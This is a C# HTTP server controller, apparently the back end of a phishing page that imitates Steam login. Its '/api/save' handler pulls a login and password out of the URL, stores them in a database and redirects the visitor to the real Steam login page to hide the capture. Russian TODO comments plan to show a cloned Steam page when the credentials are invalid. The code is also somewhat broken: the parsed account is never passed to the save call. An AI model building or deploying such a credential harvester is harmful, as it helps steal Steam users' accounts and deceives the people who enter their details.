using System;
using System.Net;
using System.Security.AccessControl;
using System.Text;
using HTTPServer.Models;
using HTTPServer.Services;


namespace HTTPServer.Controllers
{
    [ApiController("api")]
    public class ApiController
    {
        //TODO: сделать обработчик параметров, передавть уже готовую модель
        //TODO: если пароль и логин не валидны вернуть свою же страницу стим
        //TODO: както избавиться от префиксов в rawurl зная роутинг аттрибутов
        //TODO: изменить статус код на 303 -  see other
        [HttpGet("save")]
        public async Task<HttpListenerResponse?> SaveAccount(HttpListenerContext context)
        {
            var request = context.Request;
            var response = context.Response;
            var rawUrl = request.RawUrl.Replace("%20", " ").Replace(@"/api/save", string.Empty);
            if(HttpListenerRequestHelper.TryParse(rawUrl , out SteamAccount? account))
            {
                await DBProvider.AddAsync();
                response.StatusCode = (int)HttpStatusCode.Redirect;
                response.Headers.Set("Location", @"https://store.steampowered.com/login");
                return response;
            }
            response.SetStatusCode((int)HttpStatusCode.BadRequest)
                        .SetContentType(".txt")
                        .Write403PageToBody();
            return response;
        }
    }
}
